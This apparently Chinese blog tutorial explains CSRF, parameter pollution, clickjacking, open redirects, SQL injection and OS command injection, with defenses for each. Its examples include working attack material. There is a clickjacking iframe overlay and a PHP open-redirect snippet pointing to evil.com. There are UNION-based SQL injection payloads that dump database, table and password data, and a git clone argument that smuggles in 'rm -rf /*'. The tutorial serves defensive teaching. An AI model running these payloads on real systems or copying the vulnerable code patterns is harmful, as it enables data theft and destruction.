+<p><img src="https://pic3.zhimg.com/80/v2-5f5c6de58fcbc58703b3a3d83284e942_hd.jpg#id=VidmZ&originHeight=406&originWidth=720&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
+<p>完成 CSRF 攻击必须要有三个条件：</p>
+<ol>
+<li>用户已经登录了站点 A，并在本地记录了 cookie</li>
+<li>在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点 A)。</li>
+<li>站点 A 没有做任何 CSRF 防御</li>
+</ol>
+<p>我们来看一个例子： 当我们登入转账页面后，突然眼前一亮<strong>惊现”XXX 隐私照片，不看后悔一辈子”的链接</strong>，耐不住内心躁动，立马点击了该危险的网站（页面代码如下图所示），但当这页面一加载，便会执行<code>submitForm</code>这个方法来提交转账请求，从而将 10 块转给黑客。</p>
+<p><img src="https://pic1.zhimg.com/80/v2-c549af63c3f0a490c9c24b5ce21155c8_hd.jpg#id=I95M9&originHeight=388&originWidth=548&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
+<h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><p>防范 CSRF 攻击可以遵循以下几种规则：<br>​</p>
+<ul>
+<li>Get 请求不对数据进行修改</li>
+<li>不让第三方网站访问到用户 Cookie</li>
+<li>阻止第三方网站请求接口</li>
+<li>请求时附带验证信息，比如验证码或者 Token</li>
+</ul>
+<h4 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h4><p>可以对 Cookie 设置 SameSite 属性。该属性表示 Cookie 不随着跨域请求发送，可以很大程度减少 CSRF 的攻击，但是该属性目前并不是所有浏览器都兼容。</p>
+<h4 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h4><p>HTTP Referer 是 header 的一部分，当浏览器向 web 服务器发送请求时，一般会带上 Referer 信息告诉服务器是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。可以通过检查请求的来源来防御 CSRF 攻击。正常请求的 referer 具有一定规律，如在提交表单的 referer 必定是在该页面发起的请求。所以<strong>通过检查 http 包头 referer 的值是不是这个页面，来判断是不是 CSRF 攻击</strong>。</p>
+<p>但在某些情况下如从 https 跳转到 http，浏览器处于安全考虑，不会发送 referer，服务器就无法进行 check 了。若与该网站同域的其他网站有 XSS 漏洞，那么攻击者可以在其他网站注入恶意脚本，受害者进入了此类同域的网址，也会遭受攻击。出于以上原因，无法完全依赖 Referer Check 作为防御 CSRF 的主要手段。但是可以通过 Referer Check 来监控 CSRF 攻击的发生。</p>
+<h4 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h4><p>目前比较完善的解决方案是加入 Anti-CSRF-Token。即发送请求时在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器建立一个拦截器来验证这个 token。服务器读取浏览器当前域 cookie 中这个 token 值，会进行校验该请求当中的 token 和 cookie 当中的 token 值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。</p>
+<p><strong>这种方法相比 Referer 检查要安全很多</strong>，token 可以在用户登陆后产生并放于 session 或 cookie 中，然后在每次请求时服务器把 token 从 session 或 cookie 中拿出，与本次请求中的 token 进行比对。由于 token 的存在，攻击者无法再构造出一个完整的 URL 实施 CSRF 攻击。但在处理多个页面共存问题时，当某个页面消耗掉 token 后，其他页面的表单保存的还是被消耗掉的那个 token，其他页面的表单提交时会出现 token 错误。</p>
+<p><strong>防范</strong></p>
+<p>token：服务端预先生成一个随机数，在渲染具有表单的页面时将随机数以不可见的形式( visible:hidden )插入到表单域，客户端请求时带上这个随机数，服务端进行校验，确定请求确实来自该页面。</p>
+<p>对于 B 网站，即使请求会带上 cookie，也由于获取不到该随机数（该随机数每次刷新页面都不一致），导致后端校验失败。</p>
+<ul>
+<li>Synchronizer Tokens：通过响应页面时将 token 渲染到页面上，在 form 表单提交的时候通过隐藏域提交上来。</li>
+<li>Double Cookie Defense：将 token 设置在 Cookie 中，在提交（POST、PUT、PATCH、DELETE 等）请求时提交 Cookie，并通过 header 或者 body 带上 Cookie 中的 token，服务端进行对比校验。</li>
+</ul>
+<p>​</p>
+<p>​</p>
+<h4 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h4><p>应用程序和用户进行交互过程中，特别是账户交易这种核心步骤，强制用户输入验证码，才能完成最终请求。在通常情况下，验证码够很好地遏制 CSRF 攻击。<strong>但增加验证码降低了用户的体验，网站不能给所有的操作都加上验证码</strong>。所以只能将验证码作为一种辅助手段，在关键业务点设置验证码。</p>
+<h2 id="HPP"><a href="#HPP" class="headerlink" title="HPP"></a>HPP</h2><p>HTTP Parameter Pollution，HTTP 参数污染。在 HTTP 协议中是运行同样名称的参数出现多次，攻击者通过传播参数的时候传输 key 相同而 value 不同的参数，从而达到绕过某些防护与参数校验的后果。它是一种注入型的漏洞，攻击者通过在 HTTP 请求中插入特定的参数来发起攻击。</p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>漏洞报告中是将 URL：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://hackerone.com/blog/introducing-signal">https://hackerone.com/blog/introducing-signal</a></p>
+</blockquote>
+<p>修改为：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://hackerone.com/blog/introducing-signal?&amp;u=https://me.ursb.me">https://hackerone.com/blog/introducing-signal?&amp;u=https://me.ursb.me</a></p>
+</blockquote>
+<p>当通过社交媒体链接分析内容时，此链接就会变成：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&amp;u=https://me.ursb.me">https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&amp;u=https://me.ursb.me</a></p>
+</blockquote>
+<p>这里，最后的参数 u 就会拥有比第一个更高的优先级，在 Facebook 分享时，Facebook 会跳转到 <a href="https://link.zhihu.com/?target=https://me.ursb.me/">https://me.ursb.me</a> 而非 hackerone。<br>​</p>
+<h3 id="防御方法-2"><a href="#防御方法-2" class="headerlink" title="防御方法"></a>防御方法</h3><p>HPP 的行为主要取决于后端收到多个名称相同的参数时会如何处理。不同服务器处理方式不同<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630054543248-3cf44eb2-4408-4153-a9dc-76a0aa8cc183.png#clientId=u1454f11f-1aed-4&from=paste&id=u8a07563f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=403&originWidth=691&originalType=url%E2%88%B6=1&size=159914&status=done&style=none&taskId=u2ce0e1c0-0d7a-4a8a-bebc-53d76f0c03f" alt="image.png"><br>我们需要注意 HTTP 协议是允许同名的参数的，在整个应用的处理过程中要意识到这一点从而根据业务的特征对这样的情况作正确的处理。当然要防止 HPP 漏洞，最重要的是后端一定要做好对输入参数的校验。</p>
+<h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><p>点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。</p>
+<h3 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h3><ul>
+<li>隐蔽性较高，骗取用户操作</li>
+<li>“UI-覆盖攻击”</li>
+<li>利用 iframe 或者其它标签的属性</li>
+</ul>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>用户在登陆 A 网站的系统后，被攻击者诱惑打开第三方网站，而第三方网站通过 iframe 引入了 A 网站的页面内容，用户在第三方网站中点击某个按钮（被装饰的按钮），实际上是点击了 A 网站的按钮。<br>接下来我们举个例子：我在优酷发布了很多视频，想让更多的人关注它，就可以通过点击劫持来实现</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">iframe &#123;</span><br><span class="line">  width: 1440px;</span><br><span class="line">  height: 900px;</span><br><span class="line">  position: absolute;</span><br><span class="line">  top: -0px;</span><br><span class="line">  left: -0px;</span><br><span class="line">  z-index: 2;</span><br><span class="line">  -moz-opacity: 0;</span><br><span class="line">  opacity: 0;</span><br><span class="line">  filter: alpha(opacity=0);</span><br><span class="line">&#125;</span><br><span class="line">button &#123;</span><br><span class="line">  position: absolute;</span><br><span class="line">  top: 270px;</span><br><span class="line">  left: 1150px;</span><br><span class="line">  z-index: 1;</span><br><span class="line">  width: 90px;</span><br><span class="line">  height:40px;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">......</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>点击脱衣<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://pic1.win4000.com/wallpaper/2018-03-19/5aaf2bf0122d2.jpg&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://i.youku.com/u/UMjA0NTg4Njcy&quot;</span> <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic2.zhimg.com/80/v2-f707cdf092aa93c96b584466cac8b69d_hd.jpg#id=ugefo&originHeight=180&originWidth=800&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
+<p>从上图可知，攻击者通过图片作为页面背景，隐藏了用户操作的真实界面，当你按耐不住好奇点击按钮以后，真正的点击的其实是隐藏的那个页面的订阅按钮，然后就会在你不知情的情况下订阅了。</p>
+<p><img src="https://pic1.zhimg.com/80/v2-ad9ead59259fbb7a7cd5b271961e02d4_hd.jpg#id=OS6g9&originHeight=276&originWidth=643&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
+<h3 id="防御方法-3"><a href="#防御方法-3" class="headerlink" title="防御方法"></a>防御方法</h3><h4 id="X-FRAME-OPTIONS"><a href="#X-FRAME-OPTIONS" class="headerlink" title="X-FRAME-OPTIONS"></a>X-FRAME-OPTIONS</h4><p><code>X-FRAME-OPTIONS</code>是一个 HTTP 响应头，在现代浏览器有一个很好的支持。这个 HTTP 响应头 就是为了防御用 iframe 嵌套的点击劫持攻击。</p>
+<p>该响应头有三个值可选，分别是</p>
+<ul>
+<li>DENY，表示页面不允许通过 iframe 的方式展示</li>
+<li>SAMEORIGIN，表示页面可以在相同域名下通过 iframe 的方式展示</li>
+<li>ALLOW-FROM，表示页面可以在指定来源的 iframe 中展示</li>
+</ul>
+<h4 id="JavaScript-防御"><a href="#JavaScript-防御" class="headerlink" title="JavaScript 防御"></a>JavaScript 防御</h4><p>对于某些远古浏览器来说，并不能支持上面的这种方式，那我们只有在点击劫持节点加进 dom（a img iframe）的时候监控并去除。</p>
+<ol>
+<li>配置本站的白名单域名</li>
+<li>在 Body 上绑定 MutationObserver* ，监听 dom 追加的相关事件</li>
+<li>remove 掉没有匹配到的域名</li>
+<li>上报被删掉的域名 （确定是否误删）</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span> <span class="attr">id</span>=<span class="string">&quot;click-jack&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">html</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: none <span class="meta">!important</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (self == top) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> style = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;click-jack&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(style);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      top.<span class="property">location</span> = self.<span class="property">location</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>以上代码的作用就是当通过 iframe 的方式加载页面时，攻击者的网页直接不显示所有内容了。<br>​</p>
+<h4 id="保证-cdn-全链路-https"><a href="#保证-cdn-全链路-https" class="headerlink" title="保证 cdn 全链路 https"></a>保证 cdn 全链路 https</h4><p>回源一定也要用 https，因为回源是访问站源，https 对站点的压力会比较大，很多人不走全链路 https，但是很多时候这个环节就会被劫持<br>​</p>
+<h4 id="jsonp-获取资源资源去除-js-后缀"><a href="#jsonp-获取资源资源去除-js-后缀" class="headerlink" title="jsonp 获取资源资源去除 js 后缀"></a>jsonp 获取资源资源去除 js 后缀</h4><p>一般 jsonp 请求的都是一个服务端接口，然后服务端返回你一段代码，里面包含了一个可执行的 callbackname。请求 js 文件的时候不带 js 后缀，在 script 上增加一个 type，解析还是正常 js 代码。运营商劫持大概率通过后缀识别劫持的。不用 js 文件加载页面 js 可以绕过。</p>
+<h2 id="URL-跳转漏洞"><a href="#URL-跳转漏洞" class="headerlink" title="URL 跳转漏洞"></a>URL 跳转漏洞</h2><p>定义：借助未验证的 URL 跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题。</p>
+<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>黑客利用 URL 跳转漏洞来诱导安全意识低的用户点击，导致用户信息泄露或者资金的流失。其原理是黑客构建恶意链接(链接需要进行伪装,尽可能迷惑),发在 QQ 群或者是浏览量多的贴吧/论坛中。<br>安全意识低的用户点击后,经过服务器或者浏览器解析后，跳到恶意的网站中。</p>
+<p><img src="https://pic4.zhimg.com/80/v2-eeef7a581d7287456102267effd983ab_hd.jpg#id=jr9h5&originHeight=134&originWidth=741&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
+<p>恶意链接需要进行伪装,经常的做法是熟悉的链接后面加上一个恶意的网址，这样才迷惑用户。</p>
+<p><img src="https://pic1.zhimg.com/80/v2-dcd9762b8ded41ecc3c898298716a620_hd.jpg#id=LVWhw&originHeight=153&originWidth=800&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
+<p>诸如伪装成像如下的网址，你是否能够识别出来是恶意网址呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://gate.baidu.com/index?act=go&amp;url=http://t.cn/RVTatrd</span><br><span class="line">http://qt.qq.com/safecheck.html?flag=1&amp;url=http://t.cn/RVTatrd</span><br><span class="line">http://tieba.baidu.com/f/user/passport?jumpUrl=http://t.cn/RVTatrd</span><br></pre></td></tr></table></figure>
+
+<h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><ul>
+<li>Header 头跳转</li>
+<li>Javascript 跳转</li>
+<li>META 标签跳转</li>
+</ul>
+<p>这里我们举个 Header 头跳转实现方式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;jumpto&#x27;</span>];</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$url</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//www.wooyun.org/login.php?jumpto=http://www.evil.com</span></span><br></pre></td></tr></table></figure>
+
+<p>这里用户会认为<code>www.wooyun.org</code>都是可信的，但是点击上述链接将导致用户最终访问<code>www.evil.com</code>这个恶意网址。</p>
+<h3 id="防御方法-4"><a href="#防御方法-4" class="headerlink" title="防御方法"></a>防御方法</h3><h4 id="referer-的限制"><a href="#referer-的限制" class="headerlink" title="referer 的限制"></a>referer 的限制</h4><p>如果确定传递 URL 参数进入的来源，我们可以通过该方式实现安全限制，保证该 URL 的有效性，避免恶意用户自己生成跳转链接</p>
+<h4 id="加入有效性验证-Token"><a href="#加入有效性验证-Token" class="headerlink" title="加入有效性验证 Token"></a>加入有效性验证 Token</h4><p>我们保证所有生成的链接都是来自于我们可信域的，通过在生成的链接里加入用户不可控的 Token 对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用，但是如果功能本身要求比较开放，可能导致有一定的限制。</p>
+<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>SQL 注入是一种常见的 Web 安全漏洞，攻击者利用这个漏洞，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。</p>
+<h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>我们先举一个万能钥匙的例子来说明其原理：</p>
+<p><img src="https://pic1.zhimg.com/80/v2-25fab61ba77534f745fa6272234b593c_hd.jpg#id=RopfN&originHeight=312&originWidth=800&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登陆&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>后端的 SQL 语句可能是如下这样的：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> querySQL = <span class="string">`</span></span><br><span class="line"><span class="string">    SELECT *</span></span><br><span class="line"><span class="string">    FROM user</span></span><br><span class="line"><span class="string">    WHERE username=&#x27;<span class="subst">$&#123;username&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">    AND psw=&#x27;<span class="subst">$&#123;password&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="comment">// 接下来就是执行 sql 语句...</span></span><br></pre></td></tr></table></figure>
+
+<p>这是我们经常见到的登录页面，但如果有一个恶意攻击者输入的用户名是 <code>admin&#39; --</code>，密码随意输入，就可以直接登入系统了。why! —-这就是 SQL 注入</p>
+<p>我们之前预想的 SQL 语句是:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">AND</span> psw<span class="operator">=</span><span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是恶意攻击者用奇怪用户名将你的 SQL 语句变成了如下形式：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="comment">--&#x27; AND psw=&#x27;xxxx&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>在 SQL 中,<code>&#39; --</code>是闭合和注释的意思，– 是注释后面的内容的意思，所以查询语句就变成了：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>所谓的万能密码,本质上就是 SQL 注入的一种利用方式。</p>
+<p>一次 SQL 注入的过程包括以下几个过程：</p>
+<ol>
+<li>获取用户请求参数</li>
+<li>拼接到代码当中</li>
+<li>SQL 语句按照我们构造参数的语义执行成功</li>
+</ol>
+<p><img src="https://pic4.zhimg.com/80/v2-be9253c625dcb1353567372d0165bf57_hd.jpg#id=YsgvL&originHeight=179&originWidth=716&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
+<p>我们会发现 SQL 注入流程中与正常请求服务器类似，只是黑客控制了数据，构造了 SQL 查询，而正常的请求不会 SQL 查询这一步，<strong>SQL 注入的本质:数据和代码未分离，即数据当做了代码来执行。</strong></p>
+<p>假如网站后端代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_REQUEST[ &#x27;id&#x27; ];</span><br><span class="line">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>即 将获得 id 参数值，组合成 SQL 语句进行查询，那么就存在 SQL 注入的风险。</p>
+<ol>
+<li>攻击者通过将 id 参数设置为 1’or’1’=’1 。’或’ 语法使得 WHERE 条件一直成立，结果能查询出 users 表的所有数据。</li>
+<li>id 设置为 1’ order by n # ，要求结果以表的第 n 个字段排序，则当 n = 1,2,3…依次执行，出现报错时假设 n=5，即说明该表只有 4 个字段。</li>
+<li>通过以下 sql 能挖掘出更多的数据库信息。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">查询数据库用户，版本信息:</span><br><span class="line">1&#x27; union select 1,concat(database(),version(),user()) #</span><br><span class="line"></span><br><span class="line">查询所有数据库名字:</span><br><span class="line">1&#x27; union select 1,schema_name from information_schema.schemata #</span><br><span class="line"></span><br><span class="line">查询数据库的表名，0x64767761十六进制转字符为 dvwa:</span><br><span class="line">&#x27; union select 1,table_name from information_schema.tables where table_schema=0x64767761 #</span><br><span class="line"></span><br><span class="line">查询表的字段，0x7573657273十六进制转字符为 users:</span><br><span class="line">&#x27; union select 1,column_name from information_schema.columns where table_name=0x7573657273 #</span><br><span class="line"></span><br><span class="line">查看表的内容:</span><br><span class="line">&#x27; union select user,password from users #</span><br></pre></td></tr></table></figure>
+
+<h3 id="必备条件"><a href="#必备条件" class="headerlink" title="必备条件"></a>必备条件</h3><ul>
+<li>可以控制输入的数据</li>
+<li>服务器要执行的代码拼接了控制的数据。</li>
+</ul>
+<p>​</p>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
+<li>获取数据库信息<ul>
+<li>管理员后台用户名和密码</li>
+<li>获取其他数据库敏感信息：用户名、密码、手机号码、身份证、银行卡信息……</li>
+<li>整个数据库：脱裤</li>
+</ul>
+</li>
+<li>获取服务器权限</li>
+<li>植入 Webshell，获取服务器后门</li>
+<li>读取服务器敏感文件</li>
+</ul>
+<h3 id="防御方法-5"><a href="#防御方法-5" class="headerlink" title="防御方法"></a>防御方法</h3><ul>
+<li><strong>严格限制 Web 应用的数据库的操作权限</strong>，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害</li>
+<li><strong>后端代码检查输入的数据是否符合预期</strong>，严格限制变量的类型，例如使用正则表达式进行一些匹配处理。</li>
+<li><strong>对进入数据库的特殊字符（’，”，，&lt;，&gt;，&amp;，*，; 等）进行转义处理，或编码转换</strong>。基本上所有的后端语言都有对字符串进行转义处理的方法，比如 lodash 的 lodash._escapehtmlchar 库。</li>
+<li><strong>所有的查询语句建议使用数据库提供的参数化查询接口</strong>，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query 方法中的 ? 占位参数。</li>
+</ul>
+<h2 id="OS-命令注入攻击"><a href="#OS-命令注入攻击" class="headerlink" title="OS 命令注入攻击"></a>OS 命令注入攻击</h2><p>OS 命令注入和 SQL 注入差不多，只不过 SQL 注入是针对数据库的，而 OS 命令注入是针对操作系统的。OS 命令注入攻击指通过 Web 应用，执行非法的操作系统命令达到攻击的目的。只要在能调用 Shell 函数的地方就有存在被攻击的风险。倘若调用 Shell 时存在疏漏，就可以执行插入的非法命令。</p>
+<p>命令注入攻击可以向 Shell 发送命令，让 Windows 或 Linux 操作系统的命令行启动程序。也就是说，通过命令注入攻击可执行操作系统上安装着的各种程序。</p>
+<h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p><img src="https://pic1.zhimg.com/80/v2-78f3e30a0c902152067da516a1039938_hd.jpg#id=dhZdw&originHeight=154&originWidth=657&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
+<p>黑客构造命令提交给 web 应用程序，web 应用程序提取黑客构造的命令，拼接到被执行的命令中，因黑客注入的命令打破了原有命令结构，导致 web 应用执行了额外的命令，最后 web 应用程序将执行的结果输出到响应页面中。</p>
+<p>我们通过一个例子来说明其原理，假如需要实现一个需求：用户提交一些内容到服务器，然后在服务器执行一些系统命令去返回一个结果给用户</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo</span></span><br><span class="line"><span class="keyword">const</span> exec = <span class="built_in">require</span>(<span class="string">&quot;mz/child_process&quot;</span>).<span class="property">exec</span>;</span><br><span class="line"><span class="keyword">let</span> params = &#123;</span><br><span class="line">  <span class="comment">/* 用户输入的参数 */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">exec</span>(<span class="string">`git clone <span class="subst">$&#123;params.repo&#125;</span> /some/path`</span>);</span><br></pre></td></tr></table></figure>
+
+<p>如果 <code>params.repo</code> 传入的是 <code>https://github.com/admin/admin.github.io.git</code> 确实能从指定的 git repo 上下载到想要的代码。<br>但是如果 <code>params.repo</code> 传入的是 <code>https://github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;</code> 恰好你的服务是用 root 权限起的就糟糕了。</p>
+<h3 id="防御方法-6"><a href="#防御方法-6" class="headerlink" title="防御方法"></a>防御方法</h3><ul>
+<li>后端对前端提交内容进行规则限制（比如正则表达式）。</li>
+<li>在调用系统命令前对所有传入参数进行命令行参数转义过滤。</li>
+<li>不要直接拼接命令语句，借助一些工具做拼接、转义预处理，例如 Node.js 的 <code>shell-escape npm</code>包</li>
+</ul>
